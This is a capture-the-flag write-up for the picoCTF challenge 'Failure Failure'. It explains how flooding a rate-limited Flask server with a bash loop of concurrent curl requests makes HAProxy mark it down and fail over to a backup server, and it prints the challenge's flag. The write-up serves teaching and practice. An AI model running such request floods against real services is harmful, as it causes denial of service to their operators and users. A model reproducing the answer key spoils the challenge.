# CTF Write-up: Failure Failure

## Challenge Information

* **Challenge Name:** Failure Failure
* **Category:** General Skills
* **Points:** 200
* **Difficulty:** Medium

---

# Description

Welcome to **Failure Failure — a high-availability system simulation**.

This challenge models a real-world **failover infrastructure** where a **load balancer** routes traffic between two backend servers. One server is prioritized as the **primary**, while the second acts as a **backup**.

The flag is hidden behind the backup server, but the load balancer will only send traffic there **if the primary server fails**.

**Hint:** How does a load balancer decide which server should receive traffic?

---

# Source Code Analysis

Two files are provided:

* `haproxy.cfg`
* `app.py`

These reveal how the infrastructure works.

---

# HAProxy Configuration (`haproxy.cfg`)

```haproxy
backend servers
    option httpchk GET /
    http-check expect status 200
    server s1 *:8000 check inter 2s fall 2 rise 3
    server s2 *:9000 check backup inter 2s fall 2 rise 3
```

### Key Observations

* **s1** is the **primary server**
* **s2** is configured as a **backup server**
* HAProxy performs a **health check every 2 seconds**

Fail conditions:

* `fall 2` → server marked **DOWN after two failed checks**
* Health check expects **HTTP 200**

If **s1 returns a non-200 status twice**, HAProxy **fails over to s2**.

---

# Flask Application (`app.py`)

```python
@app.errorhandler(429)
def ratelimit_exceeded(e):
    return "Service Unavailable: Rate limit exceeded", 503

@app.route('/')
@limiter.limit("300 per minute")
def home():
    if os.getenv("IS_BACKUP") == "yes":
        flag = os.getenv("FLAG")
    else:
        flag = "No flag in this service"
    return render_template("index.html", flag=flag)
```

### Important Logic

The Flask app contains a **rate limiter**:

* Limit: **300 requests per minute**

If the limit is exceeded:

```
429 Too Many Requests → converted to 503 Service Unavailable
```

Additionally:

* The **flag only exists on the backup server**
* This occurs when:

```
IS_BACKUP == "yes"
```

---

# Exploit Strategy

## Goal

Force **HAProxy to failover to the backup server (s2)**.

## Method

Trigger the **rate limit on the primary server (s1)** so it returns **503 errors**, causing the load balancer to mark it as unhealthy.

### Step 1 — Flood the Server

Send **more than 300 requests quickly**.

Once request **#301** is reached:

```
s1 → returns HTTP 503
```

### Step 2 — Break the Health Check

HAProxy expects **HTTP 200**.

When it receives **503 responses twice**:

```
s1 marked as DOWN
```

This typically takes **~4 seconds** because checks run every 2 seconds.

### Step 3 — Trigger Failover

Once **s1 is down**, HAProxy automatically routes traffic to **s2**.

Because **s2 is the backup server**, it reveals the flag.

---

# Exploitation

A simple **bash loop** can overwhelm the rate limiter:

```bash
for i in {1..350}; do
  curl -s http://mysterious-sea.picoctf.net:65486/ > /dev/null &
done
wait
```

This sends **350 concurrent requests**, exceeding the **300 request limit**.

---

# Retrieving the Flag

After flooding the server, wait a few seconds for HAProxy to mark **s1 as down**, then send a normal request:

```bash
curl -i http://mysterious-sea.picoctf.net:65486/
```

Response:

```html
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<title>Expense Tracker</title>
</head>
<body>
<div class="container">
<h1>Welcome!!</h1>
<p>picoCTF{f41l0v3r_f0r_7h3_w1n_f8510432}</p>
<hr/>
</div>
</body>
</html>
```

---

# Flag

```
picoCTF{f41l0v3r_f0r_7h3_w1n_f8510432}
```

---

# Key Takeaways

* Load balancers rely on **health checks** to decide which server receives traffic.
* **Rate limiting side effects** can unintentionally break health checks.
* Exploiting infrastructure behavior (not application logic) is a common **real-world attack technique**.
